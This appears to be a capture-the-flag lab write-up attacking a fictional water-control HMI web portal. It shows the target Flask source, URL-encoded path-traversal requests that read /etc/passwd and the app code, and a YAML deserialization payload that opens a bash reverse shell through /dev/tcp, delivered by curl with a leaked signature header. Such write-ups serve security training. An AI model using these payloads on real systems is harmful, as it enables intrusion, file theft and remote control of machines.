---
title: 'Persistence - web'
author: 'KennyH'
---


# Persistence - web

## Description

After the notorious malware strike on the Virelia Water Control Facility, phantom alerts and erratic sensor readings plague a system that was supposed to be fully remediated.

As a Black Echo red-team specialist, you must penetrate the compromised portal, unravel its hidden persistence mechanism, and neutralise the backdoor before it can be reactivated.

----


## IP 10.10.174.195 8080

----

## Ports

```bas
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.24.0 (Ubuntu)
8080/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Finds

### Files
----

#### Debug log

http://10.10.174.195:8080/logs/view?name=debug.log

```yaml
SIGNATURE': 'secr3tFTW192d2390', 'PLCS': [{'id': 'PLC-101', 'ip': '192.168.10.11'}, {'id': 'PLC-102', 'ip': '192.168.10.12'}], 'SENSORS': [{'name': 'FlowRate', 'unit': 'L/s'}, {'name': 'Pressure', 'unit': 'bar'}]}
2025-06-28T09:56:21 DEBUG: loader script at /opt/hmi/update.py
2025-06-28T09:56:21 DEBUG: webapp script at /opt/hmi/app.py

```

Source code
```python
#!/usr/bin/env python3
import subprocess
import os
import re
import time
import yaml
import random
import datetime
from flask import (
    Flask, request, render_template,
    send_from_directory, jsonify
)

app = Flask(__name__)
APP_ROOT = &#39;/opt/hmi&#39;

def init_debug():
    cfg = yaml.safe_load(open(os.path.join(APP_ROOT, &#39;config.yaml&#39;), &#39;r&#39;))
    dbg = os.path.join(APP_ROOT, &#39;logs&#39;, &#39;debug.log&#39;)
    ts = time.strftime(&#39;%Y-%m-%dT%H:%M:%S&#39;)
    with open(dbg, &#39;a&#39;) as d:
        d.write(f&#34;{ts} STARTUP CONFIG: {cfg}\n&#34;)
        d.write(f&#34;{ts} DEBUG: loader script at {APP_ROOT}/update.py\n&#34;)
        d.write(f&#34;{ts} DEBUG: webapp script at {APP_ROOT}/app.py\n&#34;)
    return cfg

app_config = init_debug()

def log(msg, dest=&#39;app&#39;):
    path = os.path.join(APP_ROOT, &#39;logs&#39;, f&#39;{dest}.log&#39;)
    ts = time.strftime(&#39;%Y-%m-%dT%H:%M:%S&#39;)
    with open(path, &#39;a&#39;) as f:
        f.write(f&#34;{ts} {msg}\n&#34;)

@app.route(&#39;/&#39;)
def index():
    return &#39;&#39;, 302, {&#39;Location&#39;: &#39;/dashboard&#39;}

@app.route(&#39;/dashboard&#39;)
def dashboard():
    ll = os.path.join(APP_ROOT, &#39;logs&#39;, &#39;loader.log&#39;)
    last = &#39;Never&#39;
    if os.path.exists(ll):
        lines = open(ll).read().splitlines()
        if lines:
            last = lines[-1]
    return render_template(&#39;dashboard.html&#39;, plcs=app_config[&#39;PLCS&#39;], last_seen=last)

@app.route(&#39;/telemetry&#39;)
def telemetry():
    return render_template(&#39;telemetry.html&#39;)

@app.route(&#39;/sensors&#39;)
def sensors():
    labels = [(datetime.datetime.now() - datetime.timedelta(minutes=60 - i*10)).strftime(&#39;%H:%M&#39;) for i in range(7)]
    flow = [round(random.uniform(12,17),2) for _ in labels]
    pressure = [round(random.uniform(1.2,1.5),2) for _ in labels]
    return jsonify({&#39;labels&#39;: labels, &#39;datasets&#39;: [
        {&#39;label&#39;:&#39;FlowRate&#39;,&#39;data&#39;:flow},
        {&#39;label&#39;:&#39;Pressure&#39;,&#39;data&#39;:pressure}
    ]})

@app.route(&#39;/static/&lt;path:fname&gt;&#39;)
def static_files(fname):
    return send_from_directory(os.path.join(APP_ROOT, &#39;static&#39;), fname)

@app.route(&#39;/config/update&#39;, methods=[&#39;GET&#39;,&#39;POST&#39;])
def config_update():
    if request.method == &#39;POST&#39;:
        sig = request.headers.get(&#39;X-FTW&#39;,&#39;&#39;)
        if sig != app_config[&#39;SIGNATURE&#39;]:
            return &#39;Forbidden&#39;, 403
        if request.content_type != &#39;application/x-yaml&#39;:
            return &#39;Unsupported Media Type&#39;, 415
        data = request.data
        with open(os.path.join(APP_ROOT, &#39;config.yaml&#39;), &#39;wb&#39;) as f:
            f.write(data)
        log(&#39;Configuration updated&#39;, &#39;app&#39;)
        subprocess.Popen([&#39;sudo&#39;, &#39;python3&#39;, os.path.join(APP_ROOT, &#39;update.py&#39;)])
        return &#39;Configuration applied&#39;, 200
    return render_template(&#39;update.html&#39;)

@app.route(&#39;/logs/view&#39;)
def view_logs():
    raw_qs = request.environ.get(&#39;QUERY_STRING&#39;, &#39;&#39;)
    print(raw_qs)
    if &#39;/&#39; in raw_qs:
        return &#39;No logs found&#39;, 400

    name = request.args.get(&#39;name&#39;, &#39;&#39;)

    path = os.path.join(APP_ROOT, &#39;logs&#39;, name)

    if not os.path.exists(path):
        return &#39;Log not found&#39;, 404

    with open(path, &#39;r&#39;, errors=&#39;ignore&#39;) as f:
        lines = f.read().splitlines()
    return render_template(&#39;logs.html&#39;, name=name, lines=lines)
if __name__==&#39;__main__&#39;:
    app.run(host=&#39;0.0.0.0&#39;, port=8080)
```
### Logins
----

### Exploits
----

Found LFI on path : http://<IP_HERE>:8080/logs/view?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

Source code for app : http://<IP_HERE>:8080/logs/view?name=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fopt%2Fhmi%2Fapp%2Epy

Payload.yaml
```yaml
# payload.yaml
!!python/object/apply:os.system ["bash -c 'bash -i >& /dev/tcp/<IP_HERE>/<PORT_HERE> 0>&1'"]
```

Post request to spawn shell
```bash
curl -X POST \
  -H "X-FTW: secr3tFTW192d2390" \
  -H "Content-Type: application/x-yaml" \
  --data-binary @payload.yaml \
  http://<IP_HERE>:8080/config/update
```

### Priv escalation
----

## Random